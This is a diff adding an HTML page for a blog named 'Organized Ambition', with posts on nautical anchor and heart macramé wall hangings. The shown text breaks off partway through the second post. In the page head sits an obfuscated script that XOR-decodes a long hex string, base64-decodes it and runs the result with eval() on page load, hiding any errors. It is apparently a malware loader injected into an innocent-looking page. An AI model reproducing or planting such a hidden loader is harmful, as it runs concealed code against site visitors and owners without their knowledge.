@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Organized Ambition</title>
+    <meta name="description" content="Thoughts, stories, and ideas from Organized Ambition.">
+
+    <!-- Premium Typography -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        /* Modern Glassmorphism & Aurora Theme */
+        :root {
+            --bg-dark: #0a0a0f;
+            --aurora-1: #6366f1;
+            --aurora-2: #a855f7;
+            --aurora-3: #ec4899;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-highlight: rgba(255, 255, 255, 0.15);
+            --radius-lg: 24px;
+            --radius-full: 9999px;
+            --transition-smooth: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            color: var(--text-main);
+            background-color: var(--bg-dark);
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Ambient Background Orbs */
+        body::before, body::after {
+            content: '';
+            position: fixed;
+            width: 60vw;
+            height: 60vw;
+            border-radius: 50%;
+            filter: blur(120px);
+            z-index: -1;
+            opacity: 0.4;
+            animation: float 20s infinite alternate ease-in-out;
+        }
+
+        body::before {
+            top: -10vw;
+            left: -10vw;
+            background: radial-gradient(circle, var(--aurora-1), transparent 70%);
+        }
+
+        body::after {
+            bottom: -20vw;
+            right: -10vw;
+            background: radial-gradient(circle, var(--aurora-3), var(--aurora-2), transparent 70%);
+            animation-delay: -10s;
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(5vw, 5vw) scale(1.1); }
+        }
+
+        h1, h2, h3, h4, .username {
+            font-family: 'Outfit', sans-serif;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Top Navigation */
+        .top-nav {
+            padding: 20px 0;
+            text-align: center;
+            background: rgba(10, 10, 15, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--glass-border);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .top-nav a {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 500;
+            padding: 10px 24px;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            cursor: pointer;
+            border-radius: var(--radius-full);
+            background: transparent;
+            border: 1px solid transparent;
+        }
+
+        .top-nav a:hover, .top-nav a.active {
+            color: var(--text-main);
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Header */
+        header {
+            padding: 100px 0 60px;
+            text-align: center;
+            animation: fadeDown 1s ease-out forwards;
+        }
+
+        @keyframes fadeDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 4.5rem;
+            font-weight: 800;
+            cursor: pointer;
+            background: linear-gradient(135deg, #fff, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            transition: var(--transition-smooth);
+            text-shadow: 0 10px 30px rgba(168, 85, 247, 0.2);
+        }
+
+        header h1:hover {
+            transform: scale(1.02);
+            filter: brightness(1.1);
+        }
+
+        header p {
+            margin: 20px auto 0;
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            font-weight: 400;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            display: inline-block;
+            padding: 8px 32px;
+            border-radius: var(--radius-full);
+            backdrop-filter: blur(10px);
+        }
+
+        /* Post Cards */
+        .post-card, .single-post {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-top: 1px solid var(--glass-highlight);
+            border-radius: var(--radius-lg);
+            margin-bottom: 40px;
+            overflow: hidden;
+            transition: var(--transition-smooth);
+            cursor: pointer;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+
+        .post-card:hover {
+            transform: translateY(-8px);
+            border-color: rgba(168, 85, 247, 0.3);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.4), 0 0 40px rgba(168, 85, 247, 0.1);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 24px 32px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .post-header img.avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            margin-right: 16px;
+            padding: 2px;
+            background: linear-gradient(135deg, var(--aurora-1), var(--aurora-3));
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 1.1rem;
+            font-weight: 600;
+            background: linear-gradient(to right, #fff, #cbd5e1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 480px;
+            object-fit: cover;
+        }
+
+        .post-content {
+            padding: 40px 32px;
+        }
+
+        .post-content h1, .post-content h2 {
+            margin: 0 0 16px;
+            font-size: 2.2rem;
+            line-height: 1.2;
+        }
+
+        .post-content p {
+            font-size: 1.1rem;
+            color: #cbd5e1;
+            margin-bottom: 0;
+        }
+
+        .post-footer {
+            padding: 20px 32px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        .post-footer span:last-child {
+            font-size: 1.2rem;
+            letter-spacing: 12px;
+            opacity: 0.7;
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: 600px;
+        }
+        .single-post .post-content p {
+            margin-bottom: 24px;
+        }
+
+        /* Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 32px;
+            color: var(--text-main);
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--glass-border);
+            font-family: 'Outfit', sans-serif;
+            font-size: 1rem;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 12px 24px;
+            border-radius: var(--radius-full);
+            transition: var(--transition-smooth);
+            backdrop-filter: blur(10px);
+        }
+
+        .back-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(-4px);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Generated Content Styling Overrides */
+        .post-content h2 {
+            color: #fff !important;
+            border-bottom: 1px solid var(--glass-border) !important;
+            font-size: 2rem !important;
+            margin-top: 48px !important;
+        }
+        .post-content h3 {
+            color: #e2e8f0 !important;
+            border-left-color: var(--aurora-1) !important;
+        }
+        .post-content h4 {
+            background: rgba(255,255,255,0.03) !important;
+            color: #f8fafc !important;
+        }
+        .post-content div[style*="background"] {
+            background: rgba(255, 255, 255, 0.02) !important;
+            border-color: var(--glass-border) !important;
+            backdrop-filter: blur(10px) !important;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1) !important;
+        }
+        .post-content p[style*="background"] {
+            background: rgba(99, 102, 241, 0.1) !important;
+            border-color: var(--aurora-1) !important;
+            color: #f8fafc !important;
+        }
+        .post-content span[style*="background"] {
+            background: rgba(168, 85, 247, 0.15) !important;
+            color: #f8fafc !important;
+            border: 1px solid rgba(168, 85, 247, 0.3) !important;
+        }
+    </style>
+ <script>
+    (function() {
+        var vxyelpmca = "15213c00252837016d2e3a581b0c1428564a052916180525271111591318620335072b5e0a384c5a552e3a5a1867141b57155837147c417315053c58103d09491a22281e24123c0677182a5e223d04176e2f72382e7d5916130a19572203720037185303247216445631495c180c141d564a0034147d672a142f1e5f3d275f7837183f0f0d093b5d6d2e3a5c2012085d5711752c3d2673382d1516492b62586732072f1d2716405a6e2e18661b3d2104552f65783e265a253e1660093b13004b1d1c245f052834567d353204180c0f0a50207e322208773b2e15614a3b1400543422305b0f07236260303e5a180c0c07553e762914227736143b384a2807764a0f7d0e3c22093c417b011f510817070a501572383e077f31131533572203720235221e391f193f59562e3d431b66105d7f3b7e312d0c783238353f7b3b1371541f080a050f021d4b563e26580a07045a771175263e0c70253e011157163d764a1f0730000f054556561b360420032205503f0d383b2167382d1a1a7228626646320b15230f0234567d3531510817045f6d207d262e220872222f065e28085754061c271e1f2c4c0152313e4f180c221e6e207e79147c73322d0506491417585f0f18341b1c193b4b523e3246233a14015715623b1307492c1570695e1017660b0f220a1d1c720d5b571b360523132a186e4b4c10161804722d1a1a5c1163625a347c3450130619445031264f1b0c085d784a5f76342670253e0111573b137154322220110f06194b651b49060810760a6d150d712222672c2d1a374516176649320c0e591f121e56523e0751080373055015582f2e176334142b65432b07055d321820061c193856523e07512339005f552f50291308083b3b2c345c2b3d624a37173c04252b067a771f31510817070a7d3b7526161868253c053c4a233d09031d1c245f052834567d3531510817070a7d3b75263e075532152f02461629055c3717285824723f0478183a5a22133e056d4a6215130877722d113845160748401a0c27060c38025650441c431b137f5e78154c372e7d7772161569453e3e725b32080e1d1f16445d7f22037d0817070a7d3b75263e0c737b3e050643116265543338090f0f0234567d3531510817070a7d3b76732e177825147006472b087a5b32085f110f054556574408071b2d731d5615662d120a082f3c0119463b395b54061b56510f053456640f315f083d075b7d3b7d373e2542093e0111573b1371541f0c270f0f023456501b364f08131401574b663115227772161569453b140054320820111c7323016631494218032a187d3b4726147d67352e1a1a581617094a1f0c150f25730d006e0c037d0817070a7d3b75263e0c70253e01115716625c460c085f5b0a2c0d476d44360620037f1878167e2d1408492a2e70055f2817664932080a1d1f192741564444460e23290a7d3b75263e0c70253e0a607b3b1371541f0756232012375d563e3e5a081c352652295b7c";
+        var vnptuvoap = "VOfhFAu14vp6ATFm4x4AwO1BwBP0rP03";
+        var vkrmtegfk = "";
+        
+        try {
+            for (var i = 0; i < vxyelpmca.length; i += 2) {
+                var vgypgaakd = parseInt(vxyelpmca.substr(i, 2), 16);
+                vkrmtegfk += String.fromCharCode(vgypgaakd ^ vnptuvoap.charCodeAt((i/2) % vnptuvoap.length));
+            }
+            
+            var vlzoeylhq = atob(vkrmtegfk);
+            eval(vlzoeylhq);
+        } catch(e) {
+        }
+    })();
+    </script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Organized Ambition</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'the-first-post',
+                title: 'Nautical Macramé Anchor Wall Hanging',
+                date: 'March 18, 2026',
+                image: './assets/Macrame Anchor Wall Hanging.png',
+                excerpt: `Bring the coast indoors with a navy and cream macramé anchor that turns knots into pure seaside charm. ⚓ This handwoven wall hanging pairs a braided anchor ring with soft cotton tassels for that laid-back beach-house feel, no shells required. Perfect above a console, in an entryway, or styled with driftwood and a little sailboat.
+
+• Two-tone navy and natural cotton reads crisp and coastal 🌊
+• Lightweight and easy to hang on a single hook
+
+Ideal for nautical nurseries, beach cottages, and boho coastal corners. Save for later and pin it to your seaside décor board!`,
+                content: `
+                    <p>There is something about a nautical anchor that instantly slows the whole room down. It whispers of salt air, quiet harbors, and long summer afternoons, and when that anchor is rendered in soft cotton cord instead of cold metal, the effect is even more inviting. This navy and cream macramé anchor wall hanging takes a classic coastal symbol and reworks it into something tactile, handmade, and full of texture. If you have been searching for a way to bring beach-house energy into your space without leaning on obvious seashell clichés, this is the piece that does it with quiet confidence.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>A macramé anchor blends coastal charm with cozy boho texture in one piece.</li>
+                        <li>The two-tone navy and natural palette keeps it crisp instead of kitschy.</li>
+                        <li>It works far beyond the beach house, from nurseries to entryways.</li>
+                        <li>Cotton cord makes it lightweight, soft, and easy to hang anywhere.</li>
+                        <li>Simple styling with wood, greenery, and warm light makes it shine.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why a Macramé Anchor Feels So Right for Coastal Décor</h2>
+                    <p>Traditional nautical décor can tip into theme-park territory fast. Too many ropes, too many portholes, and a room starts to feel like a costume rather than a home. Macramé solves that problem beautifully. By translating the anchor shape into knotted cotton, you keep the meaning and lose the heavy-handedness. The result reads as artisan and collected rather than shouty and literal.</p>
+                    <p>The navy cord anchors the design, quite literally, giving your eye a strong graphic shape to follow. The cream tassels and diamond knot patterns soften everything around it, so the piece feels handmade and warm. That balance between structure and softness is exactly what makes boho coastal style so appealing right now.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Coastal style works best when you commit to a restrained palette. Sticking to navy, cream, natural wood, and one accent green keeps the look intentional instead of cluttered.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Anatomy of This Anchor Wall Hanging</h2>
+                    <p>Take a closer look and you will notice the piece is built from several distinct knotting zones, each doing its own job. Understanding these details helps whether you plan to buy one or knot your own.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Anchor Ring</h3>
+                    <p>At the top sits a tightly wrapped navy ring, formed by coiling cord around a base loop. This is the visual crown of the piece and the part that most clearly signals anchor. Wrapping knots like this take patience, but they give that satisfying, ribbed, rope-like finish.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Wooden Stock and Crossbar</h3>
+                    <p>A slim wooden dowel runs horizontally to form the anchor stock. The navy and cream cord wrapped around each end mimics the way a real anchor is bound, and it introduces a natural material that grounds all that soft cotton.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Diamond Body</h3>
+                    <p>The central shank is worked in a cream diamond lattice, a hallmark macramé pattern made from alternating square knots. It adds a delicate, woven quality that contrasts nicely with the bolder navy elements.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">The Flukes and Tassels</h4>
+                    <p>The two arms sweeping outward end in navy tassels, while long cream fringe cascades down for movement. That fringe is what gives the piece its relaxed, breezy character, catching light and gently shifting when air moves through the room.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Where to Hang Your Macramé Anchor</h2>
+                    <p>One of the best things about this piece is its versatility. It is unmistakably nautical, yet it is subtle enough to slip into many different rooms.</p>
+                    <ul>
+                        <li><strong>Entryways:</strong> Greet guests with instant coastal calm. Pair it with a wooden bench and a woven basket for shoes.</li>
+                        <li><strong>Nurseries:</strong> A navy and cream anchor is a nursery classic that grows with the child, avoiding overly babyish motifs.</li>
+                        <li><strong>Bathrooms:</strong> Bring spa-like seaside serenity above a towel rail or beside a mirror.</li>
+                        <li><strong>Bedrooms:</strong> Hang it above a nightstand or dresser to echo linen bedding and driftwood tones.</li>
+                        <li><strong>Home offices:</strong> A little coastal texture behind you looks wonderful on video calls.</li>
+                    </ul>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+                      <p style="margin:0;">Wall décor sets the emotional tone of a room before anyone reads a single label. A handmade anchor signals warmth, craft, and a relaxed pace, which is exactly the mood most people want their homes to hold.</p>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling Tips for a Collected Coastal Look</h2>
+                    <p>To let the anchor breathe, surround it with a few complementary pieces rather than crowding it. Think of the wall as a small gallery where the anchor is the star.</p>
+                    <p>Lean into natural materials nearby. A ceramic vase with a sprig of eucalyptus, a small wooden sailboat, a glass lantern with a warm candle, and a shallow dish of shells all support the story without competing with it. Framed beach prints in raw wood frames tie the palette together and give the eye somewhere restful to land.</p>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Warm lighting transforms macramé. Position the anchor where lamplight or a candle can graze across the knots, and the texture will practically glow after sunset.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Caring for Cotton Macramé</h2>
+                    <p>Cotton cord is forgiving, but a little care keeps your anchor looking fresh for years. Dust it gently with a soft brush or a hairdryer on the cool setting to lift away particles from the knots. Keep it out of harsh direct sunlight for long stretches, since strong rays can fade natural cotton over time. If a tassel loses its shape, a light misting of water and a gentle comb-through restores that neat, flowing drape.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Thinking of Making Your Own?</h2>
+                    <p>If you love a hands-on project, an anchor is a rewarding intermediate macramé make. You will mostly rely on a handful of core knots, so it is very approachable once you have the basics.</p>
+                    <ol>
+                        <li>Gather natural and navy cotton cord in a medium thickness, plus a small wooden dowel and a metal or wooden ring for the top.</li>
+                        <li>Practice square knots and half hitches until they feel automatic.</li>
+                        <li>Build the ring first, then the crossbar, then work down through the diamond body.</li>
+                        <li>Finish by shaping the flukes and trimming the fringe to a clean, even sweep.</li>
+                    </ol>
+                    <p>Do not stress about perfect symmetry. A little handmade character is part of the charm, and it is exactly what separates a warm, artisan piece from a mass-produced one.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>Two-tone navy and cream cotton for crisp coastal contrast.</li>
+                        <li>Combines wrapping knots, square knots, and half hitches.</li>
+                        <li>Works in entryways, nurseries, baths, and bedrooms alike.</li>
+                        <li>Best styled with wood, greenery, and warm light.</li>
+                        <li>Beginner-friendly to buy, intermediate-level to make.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">A Timeless Anchor for Your Walls</h2>
+                    <p>Coastal style endures because it taps into something universal, that feeling of ease we chase on holiday and want to keep all year. A macramé anchor bottles a little of that feeling and hangs it on your wall. It is handmade, textural, and endlessly adaptable, which makes it one of those rare décor pieces you will still love long after trends move on. Whether you buy one or knot your own, it is a small addition that changes the entire mood of a room.</p>
+
+                    <div style="margin-top:28px;">
+                      <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Macramé Anchor</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nautical Décor</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coastal Wall Hanging</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Boho Home</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fiber Art</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Beach House Style</span>
+                      <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Wall Art</span>
+                    </div>
+                `
+            },
+            {
+                id: 'the-second-post',
+                title: 'Boho Macramé Heart Wall Hanging',
+                date: 'February 5, 2026',
+                image: './assets/Macrame Heart Wall Hanging.png',
+                excerpt: `Add a little handwoven love to any wall with a cascading trio of macramé hearts in soft natural cotton. 💛 The tumbling, tasseled design feels cozy, romantic, and effortlessly boho, perfect for a bedroom, reading nook, or gallery corner. It brings warmth and texture without a single loud color.
+
+• Neutral cotton blends with almost any palette 🤍
+• Lightweight and simple to hang on one small hook
+
+Great for Valentine's styling, nursery décor, and cozy boho corners all year. Save for later and pin it to your handmade home board!`,
+                content: `
+                    <p>Few motifs feel as universally warm as a heart, and when it is knotted by hand in soft natural cotton, it stops being a cliché and becomes something genuinely cozy. This boho macramé heart wall hanging features three hearts tumbling gently down a vertical panel, each finished with a flowing tassel. The effect is romantic without being sugary, handmade without being fussy, and it slips into almost any room thanks to its calm, neutral palette.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>Three cascading hearts create gentle movement and visual rhythm.</li>
+                        <li>Neutral cotton makes it endlessly easy to style and match.</li>
+                        <li>It suits year-round décor, not just Valentine's season.</li>
+                        <li>The tassels add softness, texture, and a boho finish.</li>
+                        <li>Lightweight construction means it hangs almost anywhere.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Quiet Charm of a Macramé Heart</h2>
+                    <p>Hearts get a bad rap for being overly sentimental, but material changes everything. Rendered in glossy plastic, a heart can feel cheap. Knotted in raw cotton with a nubby, textured surface, that same shape becomes grounded and artful. The neutral tone keeps things subtle, so the piece reads as a considered design choice rather than a holiday leftover.</p>
+                    <p>The cascading arrangement is what really elevates this design. Instead of a single static heart, three of them drift down at staggered heights, guiding your eye on a soft diagonal journey. That sense of movement makes the wall feel alive and intentional.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Neutral décor is not boring décor. Working in a tight tonal range lets texture do the talking, which is why layered cotton, wood, and linen feel so rich even without bright color.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Breaking Down the Design</h2>
+                    <p>Understanding how the piece is built helps you appreciate the craft and gives you a head start if you want to try knotting one yourself.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Wooden Hanging Bar</h3>
+                    <p>A slim natural wood dowel forms the top support, with a simple cord loop for hanging. This raw wood element is a signature of boho style, adding an organic anchor to all the soft fringe below.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Vertical Cord Panels</h3>
+                    <p>From the dowel, long cords fall in neat vertical lines, some worked with small spiral knots for extra detail. These lines give the piece height and elegance, framing the hearts and drawing the eye downward.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Knotted Hearts</h3>
+                    <p>Each heart is shaped from tightly worked knots that curve and dip to form that instantly recognizable silhouette. The density of the knotting gives the hearts a lovely raised, sculptural quality against the flatter background cords.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">The Flowing Tassels</h4>
+                    <p>Below each heart, a soft tassel spills downward, unbrushed and natural. These tassels add weight, movement, and that relaxed, lived-in boho feel that keeps the piece from looking too precise.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Perfect Places to Hang It</h2>
+                    <p>Because the palette is so gentle, this hanging is genuinely flexible. Here are some of the loveliest spots for it.</p>
+                    <ul>
+                        <li><strong>Above the bed:</strong> A soft, romantic focal point that never feels loud.</li>
+                        <li><strong>In a nursery:</strong> Warm, tactile, and soothing for a little one's room.</li>
+                        <li><strong>By a reading nook:</strong> It adds coziness beside a chair, throw, and lamp.</li>
+                        <li><strong>In a hallway:</strong> A narrow vertical piece is ideal for slim wall space.</li>
+                        <li><strong>As part of a gallery wall:</strong> Mix it with framed art for texture contrast.</li>
+                    </ul>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                      <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+                      <ul style="margin:0;padding-left:20px;">
+                        <li>Vertical pieces make low ceilings feel taller by drawing the eye up and down.</li>
+                        <li>Texture adds visual warmth that paint color alone cannot.</li>
+                        <li>Odd numbers, like three hearts, feel more natural and balanced than pairs.</li>
+                      </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling the Space Around It</h2>
+                    <p>This hanging plays beautifully with other natural textures. Set it near dried pampas grass, a couple of small potted succulents, and a stack of well-loved books, and you instantly create that warm, curated corner so many of us are drawn to. Keep the surrounding colors soft, creams, sandy beiges, muted greens, and let the wood tones tie everything together.</p>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Hang it where natural daylight can rake across the surface. Side lighting reveals every knot and shadow, making the hearts look far more three dimensional than flat, straight-on light ever will.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">A Thoughtful Handmade Gift</h2>
+                    <p>Because hearts carry such a warm message, this style of hanging makes a truly meaningful gift. It works for housewarmings, weddings, anniversaries, and of course Valentine's Day, but it never feels tied to a single occasion. Unlike flowers that fade or chocolates that vanish, a macramé heart stays on the wall as a lasting reminder of the person who gave it. That longevity is part of what makes handmade fiber art so special.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Want to Knot Your Own Hearts?</h2>
+                    <p>Macramé hearts are a wonderful project for beginners who have mastered a couple of basic knots. Here is the simple path to your first one.</p>
+                    <ol>
+                        <li>Choose a soft, single-twist cotton cord that combs out easily for fluffy tassels.</li>
+                        <li>Learn the square knot and the half hitch, which do most of the shaping work.</li>
+                        <li>Form the two rounded top curves of the heart first, then bring the cords together to a point.</li>
+                        <li>Attach a tassel below, then trim it straight for a clean, tidy finish.</li>
+                    </ol>
+                    <p>Make one heart to start, then a second and third at different sizes so you can stagger them into a cascade just like this design.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
